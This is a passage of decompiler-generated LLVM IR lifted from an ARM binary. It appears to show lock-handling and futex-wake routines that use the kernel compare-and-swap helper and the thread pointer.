  store i8 0, i8* %v4_b8cc, align 1
  %v0_b8d0 = load i32, i32* @r5, align 4
  %v1_b8d0 = inttoptr i32 %v0_b8d0 to i16*
  %v2_b8d0 = load i16, i16* %v1_b8d0, align 2
  %v3_b8d0 = zext i16 %v2_b8d0 to i32
  store i32 %v3_b8d0, i32* %r2.global-to-local, align 4
  %v0_b8d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8d4 = inttoptr i32 %v0_b8d4 to i32*
  %v2_b8d4 = load i32, i32* %v1_b8d4, align 4
  store i32 %v2_b8d4, i32* @r1, align 4
  %v1_b8d8 = add i32 %v0_b8d0, 8
  %v2_b8d8 = inttoptr i32 %v1_b8d8 to i32*
  %v3_b8d8 = load i32, i32* %v2_b8d8, align 4
  store i32 %v3_b8d8, i32* %r3.global-to-local, align 4
  %v1_b8dc = and i32 %v3_b8d0, 8192
  %v2_b8dc = icmp eq i32 %v1_b8dc, 0
  %v2_b8e0 = add i32 %v0_b8d0, 20
  %v3_b8e0 = inttoptr i32 %v2_b8e0 to i32*
  store i32 %v3_b8d8, i32* %v3_b8e0, align 4
  %v0_b8e4 = load i32, i32* @r1, align 4
  %v1_b8e4 = load i32, i32* @r5, align 4
  %v2_b8e4 = add i32 %v1_b8e4, 52
  %v3_b8e4 = inttoptr i32 %v2_b8e4 to i32*
  store i32 %v0_b8e4, i32* %v3_b8e4, align 4
  %v0_b8e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8e8 = load i32, i32* @r5, align 4
  %v2_b8e8 = add i32 %v1_b8e8, 24
  %v3_b8e8 = inttoptr i32 %v2_b8e8 to i32*
  store i32 %v0_b8e8, i32* %v3_b8e8, align 4
  %v0_b8ec = load i32, i32* %r3.global-to-local, align 4
  %v1_b8ec = load i32, i32* @r5, align 4
  %v2_b8ec = add i32 %v1_b8ec, 28
  %v3_b8ec = inttoptr i32 %v2_b8ec to i32*
  store i32 %v0_b8ec, i32* %v3_b8ec, align 4
  %v0_b8f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8f0 = load i32, i32* @r5, align 4
  %v2_b8f0 = add i32 %v1_b8f0, 16
  %v3_b8f0 = inttoptr i32 %v2_b8f0 to i32*
  store i32 %v0_b8f0, i32* %v3_b8f0, align 4
  %v0_b8f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b8f4 = load i32, i32* @r5, align 4
  %v2_b8f4 = add i32 %v1_b8f4, 44
  %v3_b8f4 = inttoptr i32 %v2_b8f4 to i32*
  store i32 %v0_b8f4, i32* %v3_b8f4, align 4
  br i1 %v2_b8dc, label %dec_label_pc_badc, label %dec_label_pc_b8fc

dec_label_pc_b8fc:                                ; preds = %bb57
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b900 = load i32, i32* @r8, align 4
  %v2_b900 = add i32 %v0_b900, 168
  %v3_b900 = inttoptr i32 %v2_b900 to i32*
  %v4_b900 = load i32, i32* %v3_b900, align 4
  store i32 %v4_b900, i32* %r7.global-to-local, align 4
  %v0_b904 = call i32 @__aeabi_read_tp()
  store i32 %v0_b904, i32* %r0.global-to-local, align 4
  %v1_b908 = add i32 %v4_b900, 8
  %v2_b908 = inttoptr i32 %v1_b908 to i32*
  %v3_b908 = load i32, i32* %v2_b908, align 4
  store i32 %v3_b908, i32* %r3.global-to-local, align 4
  %v1_b90c = add i32 %v0_b904, -1168
  store i32 %v1_b90c, i32* %r6.global-to-local, align 4
  %v3_b910 = icmp uge i32 %v3_b908, %v1_b90c
  store i1 %v3_b910, i1* %cpsr_c.global-to-local, align 1
  %v9_b910 = icmp eq i32 %v3_b908, %v1_b90c
  br i1 %v9_b910, label %dec_label_pc_b954, label %dec_label_pc_b918

dec_label_pc_b918:                                ; preds = %dec_label_pc_b8fc
  store i32 %v4_b900, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b920

dec_label_pc_b920:                                ; preds = %dec_label_pc_b92c.dec_label_pc_b920_crit_edge, %dec_label_pc_b918
  %v0_b920 = phi i32 [ %v0_b920.pre, %dec_label_pc_b92c.dec_label_pc_b920_crit_edge ], [ %v4_b900, %dec_label_pc_b918 ]
  %v1_b920 = inttoptr i32 %v0_b920 to i32*
  %v2_b920 = load i32, i32* %v1_b920, align 4
  store i32 %v2_b920, i32* %r3.global-to-local, align 4
  %v1_b924 = load i32, i32* %r4.global-to-local, align 4
  %v3_b924 = icmp uge i32 %v2_b920, %v1_b924
  store i1 %v3_b924, i1* %cpsr_c.global-to-local, align 1
  %v9_b924 = icmp eq i32 %v2_b920, %v1_b924
  br i1 %v9_b924, label %dec_label_pc_b92c, label %dec_label_pc_b944

dec_label_pc_b92c:                                ; preds = %dec_label_pc_b920
  store i32 %v2_b920, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b93c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b93c, label %dec_label_pc_b940, label %dec_label_pc_b92c.dec_label_pc_b920_crit_edge

dec_label_pc_b92c.dec_label_pc_b920_crit_edge:    ; preds = %dec_label_pc_b92c
  %v0_b920.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b920

dec_label_pc_b940:                                ; preds = %dec_label_pc_b92c
  %v0_b940 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b940, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b944

dec_label_pc_b944:                                ; preds = %dec_label_pc_b920, %dec_label_pc_b940
  %v0_b944 = phi i32 [ %v0_b940, %dec_label_pc_b940 ], [ %v2_b920, %dec_label_pc_b920 ]
  %v1_b944 = phi i32 [ %v0_b940, %dec_label_pc_b940 ], [ %v1_b924, %dec_label_pc_b920 ]
  %v3_b944 = icmp uge i32 %v0_b944, %v1_b944
  store i1 %v3_b944, i1* %cpsr_c.global-to-local, align 1
  %v9_b944 = icmp eq i32 %v0_b944, %v1_b944
  br i1 %v9_b944, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_b944
  %v1_b948 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_b948, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b944, %bb58
  %v1_b94c = xor i1 %v9_b944, true
  call void @__pseudo_cond_branch(i1 %v1_b94c, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_b950 = load i32, i32* %r6.global-to-local, align 4
  %v1_b950 = load i32, i32* %r7.global-to-local, align 4
  %v2_b950 = add i32 %v1_b950, 8
  %v3_b950 = inttoptr i32 %v2_b950 to i32*
  store i32 %v0_b950, i32* %v3_b950, align 4
  %v1_b970.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b954

dec_label_pc_b954:                                ; preds = %dec_label_pc_b8fc, %bb59
  %v1_b970 = phi i32 [ %v3_b908, %dec_label_pc_b8fc ], [ %v1_b970.pre, %bb59 ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b958 = load i32, i32* @r8, align 4
  %v2_b958 = add i32 %v0_b958, 168
  %v3_b958 = inttoptr i32 %v2_b958 to i32*
  %v4_b958 = load i32, i32* %v3_b958, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_b960 = add i32 %v0_b958, 160
  %v3_b960 = inttoptr i32 %v2_b960 to i32*
  %v4_b960 = load i32, i32* %v3_b960, align 4
  store i32 %v4_b960, i32* %r7.global-to-local, align 4
  %v1_b964 = add i32 %v4_b958, 4
  %v2_b964 = inttoptr i32 %v1_b964 to i32*
  %v3_b964 = load i32, i32* %v2_b964, align 4
  store i32 %v3_b964, i32* %r3.global-to-local, align 4
  %v1_b968 = add i32 %v4_b960, 8
  %v2_b968 = inttoptr i32 %v1_b968 to i32*
  %v3_b968 = load i32, i32* %v2_b968, align 4
  store i32 %v3_b968, i32* %r2.global-to-local, align 4
  %v1_b96c = add i32 %v3_b964, 1
  store i32 %v1_b96c, i32* %r3.global-to-local, align 4
  %v3_b970 = icmp uge i32 %v3_b968, %v1_b970
  store i1 %v3_b970, i1* %cpsr_c.global-to-local, align 1
  %v9_b970 = icmp eq i32 %v3_b968, %v1_b970
  store i32 %v1_b96c, i32* %v2_b964, align 4
  br i1 %v9_b970, label %dec_label_pc_b9bc, label %dec_label_pc_b97c

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b954
  %v0_b980 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b980, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_b98895 = inttoptr i32 %v0_b980 to i32*
  %v2_b98896 = load i32, i32* %v1_b98895, align 4
  store i32 %v2_b98896, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_b98c98 = icmp eq i32 %v2_b98896, 0
  br i1 %v9_b98c98, label %dec_label_pc_b994, label %dec_label_pc_b9ac

dec_label_pc_b994:                                ; preds = %dec_label_pc_b97c, %dec_label_pc_b994.dec_label_pc_b988_crit_edge
  %v0_b99499 = phi i32 [ %v1_b98c.pre, %dec_label_pc_b994.dec_label_pc_b988_crit_edge ], [ 0, %dec_label_pc_b97c ]
  store i32 %v0_b99499, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b9a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b9a4, label %dec_label_pc_b9a8, label %dec_label_pc_b994.dec_label_pc_b988_crit_edge

dec_label_pc_b994.dec_label_pc_b988_crit_edge:    ; preds = %dec_label_pc_b994
  %v0_b988.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b98c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_b988 = inttoptr i32 %v0_b988.pre to i32*
  %v2_b988 = load i32, i32* %v1_b988, align 4
  store i32 %v2_b988, i32* %r3.global-to-local, align 4
  %v3_b98c = icmp uge i32 %v2_b988, %v1_b98c.pre
  store i1 %v3_b98c, i1* %cpsr_c.global-to-local, align 1
  %v9_b98c = icmp eq i32 %v2_b988, %v1_b98c.pre
  br i1 %v9_b98c, label %dec_label_pc_b994, label %dec_label_pc_b9ac

dec_label_pc_b9a8:                                ; preds = %dec_label_pc_b994
  %v0_b9a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b9a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b97c, %dec_label_pc_b994.dec_label_pc_b988_crit_edge, %dec_label_pc_b9a8
  %v0_b9ac = phi i32 [ %v0_b9a8, %dec_label_pc_b9a8 ], [ %v2_b98896, %dec_label_pc_b97c ], [ %v2_b988, %dec_label_pc_b994.dec_label_pc_b988_crit_edge ]
  %v1_b9ac = phi i32 [ %v0_b9a8, %dec_label_pc_b9a8 ], [ 0, %dec_label_pc_b97c ], [ %v1_b98c.pre, %dec_label_pc_b994.dec_label_pc_b988_crit_edge ]
  %v3_b9ac = icmp uge i32 %v0_b9ac, %v1_b9ac
  store i1 %v3_b9ac, i1* %cpsr_c.global-to-local, align 1
  %v9_b9ac = icmp eq i32 %v0_b9ac, %v1_b9ac
  br i1 %v9_b9ac, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_b9ac
  %v1_b9b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_b9b0, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_b9ac, %bb60
  %v1_b9b4 = xor i1 %v9_b9ac, true
  call void @__pseudo_cond_branch(i1 %v1_b9b4, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_b9b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_b9b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_b9b8 = add i32 %v1_b9b8, 8
  %v3_b9b8 = inttoptr i32 %v2_b9b8 to i32*
  store i32 %v0_b9b8, i32* %v3_b9b8, align 4
  br label %dec_label_pc_b9bc

dec_label_pc_b9bc:                                ; preds = %dec_label_pc_b954, %bb61
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_b9c0 = load i32, i32* @r8, align 4
  %v2_b9c0 = add i32 %v0_b9c0, 160
  %v3_b9c0 = inttoptr i32 %v2_b9c0 to i32*
  %v4_b9c0 = load i32, i32* %v3_b9c0, align 4
  store i32 %v4_b9c0, i32* %r0.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_b9c8 = add i32 %v0_b9c0, 84
  %v3_b9c8 = inttoptr i32 %v2_b9c8 to i32*
  %v4_b9c8 = load i32, i32* %v3_b9c8, align 4
  store i32 %v4_b9c8, i32* @r1, align 4
  %v1_b9cc = add i32 %v4_b9c0, 4
  %v2_b9cc = inttoptr i32 %v1_b9cc to i32*
  %v3_b9cc = load i32, i32* %v2_b9cc, align 4
  store i32 %v3_b9cc, i32* %r3.global-to-local, align 4
  %v1_b9d0 = inttoptr i32 %v4_b9c8 to i32*
  %v2_b9d0 = load i32, i32* %v1_b9d0, align 4
  store i32 %v2_b9d0, i32* %r2.global-to-local, align 4
  %v1_b9d4 = add i32 %v3_b9cc, 1
  store i32 %v1_b9d4, i32* %r3.global-to-local, align 4
  store i32 %v1_b9d4, i32* %v2_b9cc, align 4
  %v0_b9dc = load i32, i32* %r2.global-to-local, align 4
  %v1_b9dc = load i32, i32* @r5, align 4
  %v2_b9dc = add i32 %v1_b9dc, 32
  %v3_b9dc = inttoptr i32 %v2_b9dc to i32*
  store i32 %v0_b9dc, i32* %v3_b9dc, align 4
  %v0_b9e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b9e0 = add i32 %v0_b9e0, 4
  %v2_b9e0 = inttoptr i32 %v1_b9e0 to i32*
  %v3_b9e0 = load i32, i32* %v2_b9e0, align 4
  %v1_b9e4 = add i32 %v3_b9e0, -1
  store i32 %v1_b9e4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b9e8 = icmp eq i32 %v1_b9e4, 0
  %v0_b9ec = load i32, i32* @r5, align 4
  %v1_b9ec = load i32, i32* @r1, align 4
  %v2_b9ec = inttoptr i32 %v1_b9ec to i32*
  store i32 %v0_b9ec, i32* %v2_b9ec, align 4
  %v0_b9f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_b9f0 = add i32 %v1_b9f0, 4
  %v3_b9f0 = inttoptr i32 %v2_b9f0 to i32*
  store i32 %v0_b9f0, i32* %v3_b9f0, align 4
  br i1 %v2_b9e8, label %dec_label_pc_b9f8, label %dec_label_pc_ba58

dec_label_pc_b9f8:                                ; preds = %dec_label_pc_b9bc
  %v0_b9f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_b9f8 = add i32 %v1_b9f8, 8
  %v3_b9f8 = inttoptr i32 %v2_b9f8 to i32*
  store i32 %v0_b9f8, i32* %v3_b9f8, align 4
  %v0_b9fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b9fc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ba00

dec_label_pc_ba00:                                ; preds = %dec_label_pc_ba30.dec_label_pc_ba00_crit_edge, %dec_label_pc_b9f8
  %v0_ba00 = phi i32 [ %v0_ba00.pre, %dec_label_pc_ba30.dec_label_pc_ba00_crit_edge ], [ %v0_b9fc, %dec_label_pc_b9f8 ]
  %v1_ba00 = inttoptr i32 %v0_ba00 to i32*
  %v2_ba00 = load i32, i32* %v1_ba00, align 4
  store i32 %v2_ba00, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_ba00, i32* %r2.global-to-local, align 4
  %v2_ba0c83 = load i32, i32* %v1_ba00, align 4
  store i32 %v2_ba0c83, i32* %r3.global-to-local, align 4
  %v3_ba1085 = icmp uge i32 %v2_ba0c83, %v2_ba00
  store i1 %v3_ba1085, i1* %cpsr_c.global-to-local, align 1
  %v9_ba1091 = icmp eq i32 %v2_ba0c83, %v2_ba00
  br i1 %v9_ba1091, label %dec_label_pc_ba18, label %dec_label_pc_ba30

dec_label_pc_ba18:                                ; preds = %dec_label_pc_ba00, %dec_label_pc_ba18.dec_label_pc_ba0c_crit_edge
  %v0_ba1892 = phi i32 [ %v1_ba10.pre, %dec_label_pc_ba18.dec_label_pc_ba0c_crit_edge ], [ %v2_ba00, %dec_label_pc_ba00 ]
  store i32 %v0_ba1892, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_ba28 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ba28, label %dec_label_pc_ba2c, label %dec_label_pc_ba18.dec_label_pc_ba0c_crit_edge

dec_label_pc_ba18.dec_label_pc_ba0c_crit_edge:    ; preds = %dec_label_pc_ba18
  %v0_ba0c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ba10.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_ba0c = inttoptr i32 %v0_ba0c.pre to i32*
  %v2_ba0c = load i32, i32* %v1_ba0c, align 4
  store i32 %v2_ba0c, i32* %r3.global-to-local, align 4
  %v3_ba10 = icmp uge i32 %v2_ba0c, %v1_ba10.pre
  store i1 %v3_ba10, i1* %cpsr_c.global-to-local, align 1
  %v9_ba10 = icmp eq i32 %v2_ba0c, %v1_ba10.pre
  br i1 %v9_ba10, label %dec_label_pc_ba18, label %dec_label_pc_ba30

dec_label_pc_ba2c:                                ; preds = %dec_label_pc_ba18
  %v0_ba2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ba2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ba30

dec_label_pc_ba30:                                ; preds = %dec_label_pc_ba00, %dec_label_pc_ba18.dec_label_pc_ba0c_crit_edge, %dec_label_pc_ba2c
  %v0_ba38 = phi i32 [ %v0_ba2c, %dec_label_pc_ba2c ], [ %v2_ba0c83, %dec_label_pc_ba00 ], [ %v2_ba0c, %dec_label_pc_ba18.dec_label_pc_ba0c_crit_edge ]
  %v1_ba30 = phi i32 [ %v0_ba2c, %dec_label_pc_ba2c ], [ %v2_ba00, %dec_label_pc_ba00 ], [ %v1_ba10.pre, %dec_label_pc_ba18.dec_label_pc_ba0c_crit_edge ]
  %v3_ba30 = icmp uge i32 %v0_ba38, %v1_ba30
  store i1 %v3_ba30, i1* %cpsr_c.global-to-local, align 1
  %v9_ba30 = icmp eq i32 %v0_ba38, %v1_ba30
  br i1 %v9_ba30, label %dec_label_pc_ba38, label %dec_label_pc_ba30.dec_label_pc_ba00_crit_edge

dec_label_pc_ba30.dec_label_pc_ba00_crit_edge:    ; preds = %dec_label_pc_ba30
  %v0_ba00.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ba00

dec_label_pc_ba38:                                ; preds = %dec_label_pc_ba30
  %v2_ba38 = icmp ne i32 %v1_ba30, 0
  store i1 %v2_ba38, i1* %cpsr_c.global-to-local, align 1
  %v7_ba3c = icmp slt i32 %v1_ba30, 2
  br i1 %v7_ba3c, label %dec_label_pc_ba58, label %dec_label_pc_ba40

dec_label_pc_ba40:                                ; preds = %dec_label_pc_ba38
  %v0_ba40 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_ba40, i32* %r0.global-to-local, align 4
  %v0_ba44 = load i32, i32* @r1, align 4
  %v1_ba44 = add i32 %v0_ba44, 129
  store i32 %v1_ba44, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ba58

dec_label_pc_ba58:                                ; preds = %dec_label_pc_b9bc, %dec_label_pc_ba40, %dec_label_pc_ba38
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_ba5c = load i32, i32* @r8, align 4
  %v2_ba5c = add i32 %v0_ba5c, 168
  %v3_ba5c = inttoptr i32 %v2_ba5c to i32*
  %v4_ba5c = load i32, i32* %v3_ba5c, align 4
  store i32 %v4_ba5c, i32* %r0.global-to-local, align 4
  %v1_ba60 = add i32 %v4_ba5c, 4
  %v2_ba60 = inttoptr i32 %v1_ba60 to i32*
  %v3_ba60 = load i32, i32* %v2_ba60, align 4
  %v1_ba64 = add i32 %v3_ba60, -1
  store i32 %v1_ba64, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ba68 = icmp eq i32 %v1_ba64, 0
  store i32 %v1_ba64, i32* %v2_ba60, align 4
  br i1 %v2_ba68, label %dec_label_pc_ba74, label %dec_label_pc_badc

dec_label_pc_ba74:                                ; preds = %dec_label_pc_ba58
  %v0_ba74 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba74 = load i32, i32* %r0.global-to-local, align 4
  %v2_ba74 = add i32 %v1_ba74, 8
  %v3_ba74 = inttoptr i32 %v2_ba74 to i32*
  store i32 %v0_ba74, i32* %v3_ba74, align 4
  %v0_ba78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ba78, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ba7c

dec_label_pc_ba7c:                                ; preds = %dec_label_pc_baac.dec_label_pc_ba7c_crit_edge, %dec_label_pc_ba74
  %v0_ba7c = phi i32 [ %v0_ba7c.pre, %dec_label_pc_baac.dec_label_pc_ba7c_crit_edge ], [ %v0_ba78, %dec_label_pc_ba74 ]
  %v1_ba7c = inttoptr i32 %v0_ba7c to i32*
  %v2_ba7c = load i32, i32* %v1_ba7c, align 4
  store i32 %v2_ba7c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_ba7c, i32* %r2.global-to-local, align 4
  %v2_ba8871 = load i32, i32* %v1_ba7c, align 4
  store i32 %v2_ba8871, i32* %r3.global-to-local, align 4
  %v3_ba8c73 = icmp uge i32 %v2_ba8871, %v2_ba7c
  store i1 %v3_ba8c73, i1* %cpsr_c.global-to-local, align 1
  %v9_ba8c79 = icmp eq i32 %v2_ba8871, %v2_ba7c
  br i1 %v9_ba8c79, label %dec_label_pc_ba94, label %dec_label_pc_baac

dec_label_pc_ba94:                                ; preds = %dec_label_pc_ba7c, %dec_label_pc_ba94.dec_label_pc_ba88_crit_edge
  %v0_ba9480 = phi i32 [ %v1_ba8c.pre, %dec_label_pc_ba94.dec_label_pc_ba88_crit_edge ], [ %v2_ba7c, %dec_label_pc_ba7c ]
  store i32 %v0_ba9480, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_baa4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_baa4, label %dec_label_pc_baa8, label %dec_label_pc_ba94.dec_label_pc_ba88_crit_edge

dec_label_pc_ba94.dec_label_pc_ba88_crit_edge:    ; preds = %dec_label_pc_ba94
  %v0_ba88.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ba8c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_ba88 = inttoptr i32 %v0_ba88.pre to i32*
  %v2_ba88 = load i32, i32* %v1_ba88, align 4
  store i32 %v2_ba88, i32* %r3.global-to-local, align 4
  %v3_ba8c = icmp uge i32 %v2_ba88, %v1_ba8c.pre
  store i1 %v3_ba8c, i1* %cpsr_c.global-to-local, align 1
  %v9_ba8c = icmp eq i32 %v2_ba88, %v1_ba8c.pre
  br i1 %v9_ba8c, label %dec_label_pc_ba94, label %dec_label_pc_baac

dec_label_pc_baa8:                                ; preds = %dec_label_pc_ba94
  %v0_baa8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_baa8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_baac

dec_label_pc_baac:                                ; preds = %dec_label_pc_ba7c, %dec_label_pc_ba94.dec_label_pc_ba88_crit_edge, %dec_label_pc_baa8
  %v0_bab4 = phi i32 [ %v0_baa8, %dec_label_pc_baa8 ], [ %v2_ba8871, %dec_label_pc_ba7c ], [ %v2_ba88, %dec_label_pc_ba94.dec_label_pc_ba88_crit_edge ]
  %v1_baac = phi i32 [ %v0_baa8, %dec_label_pc_baa8 ], [ %v2_ba7c, %dec_label_pc_ba7c ], [ %v1_ba8c.pre, %dec_label_pc_ba94.dec_label_pc_ba88_crit_edge ]
  %v3_baac = icmp uge i32 %v0_bab4, %v1_baac
  store i1 %v3_baac, i1* %cpsr_c.global-to-local, align 1
  %v9_baac = icmp eq i32 %v0_bab4, %v1_baac
  br i1 %v9_baac, label %dec_label_pc_bab4, label %dec_label_pc_baac.dec_label_pc_ba7c_crit_edge

dec_label_pc_baac.dec_label_pc_ba7c_crit_edge:    ; preds = %dec_label_pc_baac
  %v0_ba7c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ba7c

dec_label_pc_bab4:                                ; preds = %dec_label_pc_baac
  %v2_bab4 = icmp ne i32 %v1_baac, 0
  store i1 %v2_bab4, i1* %cpsr_c.global-to-local, align 1
  %v7_bab8 = icmp slt i32 %v1_baac, 2
  br i1 %v7_bab8, label %dec_label_pc_badc, label %dec_label_pc_babc

dec_label_pc_babc:                                ; preds = %dec_label_pc_bab4
  %v0_babc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_babc, i32* %r0.global-to-local, align 4
  %v0_bac0 = load i32, i32* @r1, align 4
  %v1_bac0 = add i32 %v0_bac0, 129
  store i32 %v1_bac0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_badc

dec_label_pc_bad8:                                ; preds = %dec_label_pc_b71c, %dec_label_pc_b700, %dec_label_pc_b728
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_badc

dec_label_pc_badc:                                ; preds = %dec_label_pc_ba58, %dec_label_pc_bab4, %bb57, %dec_label_pc_b760, %dec_label_pc_babc, %dec_label_pc_bad8
  %v0_badc = load i32, i32* @r5, align 4
  store i32 %v0_badc, i32* %r0.global-to-local, align 4
  %v2_bae4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_bae4, i32* @r4, align 4
  store i32 %v6_b6c0, i32* @r5, align 4
  store i32 %v9_b6c0, i32* @r6, align 4
  store i32 %v12_b6c0, i32* @r7, align 4
  store i32 %v15_b6c0, i32* @r8, align 4
  ret i32 %v0_badc

; uselistorder directives
  uselistorder i32 %v0_baa8, { 1, 0, 2 }
  uselistorder i32 %v1_ba8c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ba7c, { 1, 0 }
  uselistorder i32 %v0_ba2c, { 1, 0, 2 }
  uselistorder i32 %v1_ba10.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ba00, { 1, 0 }
  uselistorder i32 %v0_b9a8, { 1, 0, 2 }
  uselistorder i32 %v1_b98c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b940, { 1, 0, 2 }
  uselistorder i32 %v1_b924, { 0, 2, 1 }
  uselistorder i32 %v4_b900, { 2, 1, 0, 3 }
  uselistorder i32 %v1_b8b0.pre, { 2, 1, 0 }
  uselistorder i32 %v0_b834, { 1, 2, 0 }
  uselistorder i32 %v1_b7c4, { 1, 0 }
  uselistorder i32 %v0_b7c4, { 1, 0 }
  uselistorder i32 %v1_b7ac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b750, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 52, 6, 7, 8, 9, 10, 12, 11, 1, 14, 13, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 19, 18, 20, 22, 21, 26, 23, 24, 25, 28, 27, 29, 30 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 36, 37, 9, 10, 11, 34, 35, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i8 98, { 1, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_badc, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_bad8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_baac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ba94, { 1, 0 }
  uselistorder label %dec_label_pc_ba58, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ba30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ba18, { 1, 0 }
  uselistorder label %dec_label_pc_b9bc, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_b9ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b994, { 1, 0 }
  uselistorder label %dec_label_pc_b954, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_b944, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b88c, { 1, 0 }
